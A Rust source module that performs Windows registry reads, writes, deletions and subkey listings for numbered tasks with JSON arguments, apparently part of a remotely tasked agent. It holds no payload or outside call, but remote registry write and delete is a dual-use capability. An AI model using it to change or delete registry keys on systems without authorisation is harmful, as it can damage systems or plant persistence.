/// Config store: Windows registry read/write/delete operations.

use super::TaskResult;
use serde_json::json;

pub fn read_key(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        read_key_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "registry operations only available on Windows".to_string())
    }
}

pub fn write_key(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        write_key_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "registry operations only available on Windows".to_string())
    }
}

pub fn delete_key(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        delete_key_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "registry operations only available on Windows".to_string())
    }
}

pub fn list_subkeys(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        list_subkeys_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "registry operations only available on Windows".to_string())
    }
}

#[cfg(target_os = "windows")]
fn get_hive(name: &str) -> Option<winapi::shared::minwindef::HKEY> {
    use winapi::um::winreg::*;
        use winapi::shared::minwindef::HKEY;
    match name.to_uppercase().as_str() {
        "HKLM" | "HKEY_LOCAL_MACHINE" => Some(HKEY_LOCAL_MACHINE),
        "HKCU" | "HKEY_CURRENT_USER" => Some(HKEY_CURRENT_USER),
        "HKCR" | "HKEY_CLASSES_ROOT" => Some(HKEY_CLASSES_ROOT),
        "HKU" | "HKEY_USERS" => Some(HKEY_USERS),
        _ => None,
    }
}

#[cfg(target_os = "windows")]
fn read_key_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    use winapi::um::winreg::*;
        use winapi::shared::minwindef::HKEY;
    use winapi::um::winnt::*;
    use std::ptr;

    let hive_name = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKLM");
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };
    let name = match args.get("name").and_then(|v| v.as_str()) {
        Some(n) => n,
        None => return TaskResult::error(task_id, "missing 'name' argument".to_string()),
    };

    let hive = match get_hive(hive_name) {
        Some(h) => h,
        None => return TaskResult::error(task_id, format!("unknown hive: {}", hive_name)),
    };

    unsafe {
        let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let wide_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();

        let mut hkey: HKEY = ptr::null_mut();
        let result = RegOpenKeyExW(hive, wide_path.as_ptr(), 0, KEY_READ, &mut hkey);
        if result != 0 {
            return TaskResult::error(task_id, format!("RegOpenKeyExW failed: {}", result));
        }

        let mut data_type: u32 = 0;
        let mut data_size: u32 = 0;

        // First call to get size
        RegQueryValueExW(
            hkey,
            wide_name.as_ptr(),
            ptr::null_mut(),
            &mut data_type,
            ptr::null_mut(),
            &mut data_size,
        );

        let mut data: Vec<u8> = vec![0; data_size as usize];
        let result = RegQueryValueExW(
            hkey,
            wide_name.as_ptr(),
            ptr::null_mut(),
            &mut data_type,
            data.as_mut_ptr(),
            &mut data_size,
        );

        RegCloseKey(hkey);

        if result != 0 {
            return TaskResult::error(task_id, format!("RegQueryValueExW failed: {}", result));
        }

        let value = match data_type {
            1 | 2 => {
                // REG_SZ or REG_EXPAND_SZ
                let wide: &[u16] =
                    std::slice::from_raw_parts(data.as_ptr() as *const u16, data_size as usize / 2);
                let s = String::from_utf16_lossy(wide);
                s.trim_end_matches('\0').to_string()
            }
            4 => {
                // REG_DWORD
                if data.len() >= 4 {
                    let val = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
                    val.to_string()
                } else {
                    "0".to_string()
                }
            }
            _ => crate::utils::helpers::b64_encode(&data[..data_size as usize]),
        };

        TaskResult::success(
            task_id,
            json!({
                "hive": hive_name,
                "path": path,
                "name": name,
                "type": data_type,
                "value": value,
            })
            .to_string(),
        )
    }
}

#[cfg(target_os = "windows")]
fn write_key_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    use winapi::um::winreg::*;
        use winapi::shared::minwindef::HKEY;
    use winapi::um::winnt::*;
    use std::ptr;

    let hive_name = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };
    let name = match args.get("name").and_then(|v| v.as_str()) {
        Some(n) => n,
        None => return TaskResult::error(task_id, "missing 'name' argument".to_string()),
    };
    let value = match args.get("value").and_then(|v| v.as_str()) {
        Some(v) => v,
        None => return TaskResult::error(task_id, "missing 'value' argument".to_string()),
    };
    let reg_type = args.get("type").and_then(|v| v.as_str()).unwrap_or("REG_SZ");

    let hive = match get_hive(hive_name) {
        Some(h) => h,
        None => return TaskResult::error(task_id, format!("unknown hive: {}", hive_name)),
    };

    unsafe {
        let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let wide_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();

        let mut hkey: HKEY = ptr::null_mut();
        let mut disposition: u32 = 0;
        let result = RegCreateKeyExW(
            hive,
            wide_path.as_ptr(),
            0,
            ptr::null_mut(),
            0,
            KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            &mut disposition,
        );
        if result != 0 {
            return TaskResult::error(task_id, format!("RegCreateKeyExW failed: {}", result));
        }

        let (data_type, data, data_len) = match reg_type {
            "REG_DWORD" => {
                let val: u32 = value.parse().unwrap_or(0);
                let bytes = val.to_le_bytes().to_vec();
                (4u32, bytes, 4u32)
            }
            _ => {
                // REG_SZ
                let wide_value: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
                let bytes: Vec<u8> = wide_value
                    .iter()
                    .flat_map(|w| w.to_le_bytes())
                    .collect();
                let len = bytes.len() as u32;
                (1u32, bytes, len)
            }
        };

        let result = RegSetValueExW(
            hkey,
            wide_name.as_ptr(),
            0,
            data_type,
            data.as_ptr(),
            data_len,
        );

        RegCloseKey(hkey);

        if result != 0 {
            TaskResult::error(task_id, format!("RegSetValueExW failed: {}", result))
        } else {
            TaskResult::success(task_id, format!("written {}\\\\{}\\\\{} = {}", hive_name, path, name, value))
        }
    }
}

#[cfg(target_os = "windows")]
fn delete_key_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    use winapi::um::winreg::*;
        use winapi::shared::minwindef::HKEY;
    use winapi::um::winnt::*;
    use std::ptr;

    let hive_name = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };
    let name = args.get("name").and_then(|v| v.as_str());

    let hive = match get_hive(hive_name) {
        Some(h) => h,
        None => return TaskResult::error(task_id, format!("unknown hive: {}", hive_name)),
    };

    unsafe {
        let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

        match name {
            Some(value_name) => {
                // Delete a value
                let mut hkey: HKEY = ptr::null_mut();
                let result = RegOpenKeyExW(hive, wide_path.as_ptr(), 0, KEY_WRITE, &mut hkey);
                if result != 0 {
                    return TaskResult::error(task_id, format!("RegOpenKeyExW failed: {}", result));
                }
                let wide_name: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
                let result = RegDeleteValueW(hkey, wide_name.as_ptr());
                RegCloseKey(hkey);
                if result != 0 {
                    TaskResult::error(task_id, format!("RegDeleteValueW failed: {}", result))
                } else {
                    TaskResult::success(task_id, format!("deleted value: {}\\\\{}\\\\{}", hive_name, path, value_name))
                }
            }
            None => {
                // Delete the key itself
                let result = RegDeleteKeyW(hive, wide_path.as_ptr());
                if result != 0 {
                    TaskResult::error(task_id, format!("RegDeleteKeyW failed: {}", result))
                } else {
                    TaskResult::success(task_id, format!("deleted key: {}\\\\{}", hive_name, path))
                }
            }
        }
    }
}

#[cfg(target_os = "windows")]
fn list_subkeys_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    use winapi::um::winreg::*;
        use winapi::shared::minwindef::HKEY;
    use winapi::um::winnt::*;
    use std::ptr;

    let hive_name = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKLM");
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };

    let hive = match get_hive(hive_name) {
        Some(h) => h,
        None => return TaskResult::error(task_id, format!("unknown hive: {}", hive_name)),
    };

    unsafe {
        let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey: HKEY = ptr::null_mut();
        let result = RegOpenKeyExW(hive, wide_path.as_ptr(), 0, KEY_READ, &mut hkey);
        if result != 0 {
            return TaskResult::error(task_id, format!("RegOpenKeyExW failed: {}", result));
        }

        let mut subkeys = Vec::new();
        let mut index: u32 = 0;
        loop {
            let mut name_buf: [u16; 256] = [0; 256];
            let mut name_len: u32 = 256;
            let result = RegEnumKeyExW(
                hkey,
                index,
                name_buf.as_mut_ptr(),
                &mut name_len,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
            );
            if result != 0 {
                break;
            }
            let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
            subkeys.push(name);
            index += 1;
        }

        RegCloseKey(hkey);
        TaskResult::success(task_id, serde_json::to_string(&subkeys).unwrap_or_default())
    }
}
